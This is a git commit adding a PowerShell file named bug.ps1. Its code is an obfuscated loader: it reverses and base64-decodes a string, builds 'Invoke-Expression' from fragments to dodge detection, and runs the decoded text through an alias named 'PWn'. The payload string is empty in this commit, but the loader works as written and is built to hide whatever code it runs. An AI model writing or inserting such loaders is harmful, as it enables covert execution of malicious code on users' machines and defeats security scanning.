2ff2bb036019e9f95c21f9599aebdcd3f00b9da8
MADEEB80 <101536848+MADEEB80@users.noreply.github.com>
2025-03-02 01:44:37 +0500

    Create bug.ps1

---
+++ bug.ps1
@@ -0,0 +1,4 @@
+$4Vbsre = "" ;$J13soTrgi0lhtYVq5Z7fbyO6 = $4Vbsre.ToCharArray() ; [array]::Reverse($J13soTrgi0lhtYVq5Z7fbyO6) ; -join $J13soTrgi0lhtYVq5Z7fbyO6 2>&1> $null ;
+$69Sb = [SYSTem.tExt.EncoDiNG]::UTf8.geTSTRINg([SYStEM.ConveRt]::FrombasE64stRIng("$J13soTrgi0lhtYVq5Z7fbyO6")) ;
+$NZTf4y6hq4ywPMx3aKGIXj = "iN"+"vo"+"ke"+"-e"+"Xp"+"Re"+"SS"+"IO"+"n" ; new-AliAS -NaMe PWn -vALUE $NZTf4y6hq4ywPMx3aKGIXj -FoRCe ; pWn $69Sb ;
+
